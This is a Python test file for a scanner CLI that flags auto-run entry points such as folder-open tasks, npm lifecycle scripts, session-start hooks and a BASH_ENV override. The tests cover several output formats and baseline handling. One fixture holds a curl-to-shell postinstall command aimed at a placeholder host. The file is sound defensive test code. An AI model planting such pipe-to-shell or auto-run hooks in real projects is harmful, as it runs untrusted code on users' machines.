import contextlib
import io
import json
import os
import tempfile
import unittest

from trustgate.cli import main

from helpers import TempRepo

REPO = {
    ".vscode/tasks.json": {"tasks": [{"label": "x", "command": "node x.js", "runOptions": {"runOn": "folderOpen"}}]},
    "package.json": {"scripts": {"prepare": "husky"}},
}


def run(argv):
    out = io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(io.StringIO()):
        try:
            code = main(argv)
        except SystemExit as exc:
            code = exc.code
    return code, out.getvalue()


class CliTests(unittest.TestCase):
    def test_text_and_exit_codes(self):
        with TempRepo(REPO) as root:
            code, out = run(["scan", str(root), "--no-color"])
            self.assertEqual(code, 1)
            self.assertIn("TG100 vscode-folder-open-task", out)
            self.assertIn("Summary: 1 high, 1 low", out)
            code, _ = run(["scan", str(root), "--fail-on", "critical"])
            self.assertEqual(code, 0)

    def test_json(self):
        with TempRepo(REPO) as root:
            code, out = run(["scan", str(root), "-f", "json", "--min-severity", "medium"])
        doc = json.loads(out)
        self.assertEqual(code, 1)
        self.assertEqual(doc["summary"]["high"], 1)
        self.assertEqual([f["rule"] for f in doc["findings"]], ["TG100"])

    def test_sarif_to_file(self):
        with TempRepo(REPO) as root, tempfile.TemporaryDirectory() as out_dir:
            target = os.path.join(out_dir, "r.sarif")
            run(["scan", str(root), "-f", "sarif", "-o", target])
            with open(target, encoding="utf-8") as fh:
                doc = json.load(fh)
        self.assertEqual(doc["version"], "2.1.0")
        run_ = doc["runs"][0]
        ids = [r["id"] for r in run_["tool"]["driver"]["rules"]]
        for res in run_["results"]:
            self.assertEqual(ids[res["ruleIndex"]], res["ruleId"])
            self.assertIn("trustgate/v1", res["partialFingerprints"])
        self.assertEqual({r["level"] for r in run_["results"]}, {"error", "note"})

    def test_usage_errors(self):
        self.assertEqual(run(["scan", "/definitely/not/here"])[0], 2)
        self.assertEqual(run(["scan", ".", "--ignore", "TG999"])[0], 2)
        self.assertEqual(run(["scan", ".", "--fail-on", "nope"])[0], 2)
        self.assertEqual(run([])[0], 2)

    def test_rules_listing(self):
        code, out = run(["rules"])
        self.assertEqual(code, 0)
        self.assertIn("TG500", out)

    def test_home_scan(self):
        files = {".claude/settings.json": {"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "x"}]}]}},
                 ".config/Code/User/settings.json": {"terminal.integrated.env.linux": {"BASH_ENV": "/tmp/x"}}}
        with TempRepo(files) as home:
            from trustgate.scanner import scan_home
            result = scan_home(str(home))
        self.assertEqual(sorted(f.rule_id for f in result.findings), ["TG102", "TG200"])

    def test_baseline_only_reports_new_findings(self):
        with TempRepo(REPO) as root, tempfile.TemporaryDirectory() as tmp:
            base = os.path.join(tmp, "base.json")
            code, _ = run(["baseline", str(root), "-o", base])
            self.assertEqual(code, 0)
            with open(base, encoding="utf-8") as fh:
                doc = json.load(fh)
            self.assertEqual(doc["format"], "trustgate-baseline/v1")
            self.assertEqual(len(doc["findings"]), 2)

            code, out = run(["scan", str(root), "--baseline", base, "--no-color"])
            self.assertEqual(code, 0)
            self.assertIn("No new auto-run entry points found.", out)
            self.assertIn("(2 accepted by baseline)", out)

            # Same finding on a different line stays accepted; a changed command does not.
            (root / "package.json").write_text('\n\n{"scripts": {"prepare": "husky"}}', encoding="utf-8")
            self.assertEqual(run(["scan", str(root), "--baseline", base])[0], 0)
            (root / ".vscode/tasks.json").write_text(json.dumps({"tasks": [
                {"label": "x", "command": "node y.js", "runOptions": {"runOn": "folderOpen"}}]}), encoding="utf-8")
            code, out = run(["scan", str(root), "--baseline", base, "-f", "json"])
            self.assertEqual(code, 1)
            self.assertEqual([f["rule"] for f in json.loads(out)["findings"]], ["TG100"])
            self.assertEqual(json.loads(out)["baselined"], 1)

            # A JSON report is accepted as a baseline too.
            report = os.path.join(tmp, "report.json")
            run(["scan", str(root), "-f", "json", "-o", report])
            self.assertEqual(run(["scan", str(root), "--baseline", report])[0], 0)

    def test_bad_baseline_is_a_usage_error(self):
        with tempfile.TemporaryDirectory() as tmp:
            bad = os.path.join(tmp, "bad.json")
            with open(bad, "w", encoding="utf-8") as fh:
                fh.write("[1, 2]")
            self.assertEqual(run(["scan", tmp, "--baseline", bad])[0], 2)
            self.assertEqual(run(["scan", tmp, "--baseline", os.path.join(tmp, "missing.json")])[0], 2)

    def test_github_annotations(self):
        with TempRepo(REPO) as root:
            code, out = run(["scan", str(root), "-f", "github"])
        self.assertEqual(code, 1)
        lines = out.splitlines()
        self.assertTrue(lines[0].startswith("::error file=.vscode/tasks.json,line=7,title=TG100 "))
        self.assertTrue(lines[1].startswith("::notice file=package.json,"))
        self.assertIn("1 high, 1 low", lines[-1])

    def test_github_annotation_escaping(self):
        files = {"package.json": {"scripts": {"postinstall": "a,b:c%d"}}}
        with TempRepo(files) as root:
            _, out = run(["scan", str(root), "-f", "github"])
        self.assertIn("a,b:c%25d", out.splitlines()[0].split("::", 2)[2])

    def test_markdown(self):
        files = {"package.json": {"scripts": {"postinstall": "curl ![x](https://e.example/p.png) <b>|sh"}}}
        with TempRepo(files) as root:
            code, out = run(["scan", str(root), "-f", "markdown"])
        self.assertEqual(code, 0)
        self.assertIn("| medium | `TG300` npm-lifecycle-script | `package.json:3` |", out)
        self.assertNotIn("![x](", out)
        self.assertNotIn("<b>", out)
        self.assertIn("\\|sh", out)

    def test_exclude_flag(self):
        with TempRepo(REPO) as root:
            code, out = run(["scan", str(root), "--exclude", ".vscode", "-f", "json"])
        self.assertEqual(code, 0)
        self.assertEqual([f["rule"] for f in json.loads(out)["findings"]], ["TG300"])

    def test_home_directory_is_abbreviated(self):
        from trustgate.report import _display_root
        home = os.path.expanduser("~")
        self.assertEqual(_display_root(os.path.join(home, "src", "x")), os.path.join("~", "src", "x"))
        self.assertEqual(_display_root(home + "other"), home + "other")

    def test_unwritable_output_is_a_usage_error(self):
        with TempRepo(REPO) as root:
            self.assertEqual(run(["scan", str(root), "-o", str(root / "missing" / "dir" / "r.txt")])[0], 2)


if __name__ == "__main__":
    unittest.main()
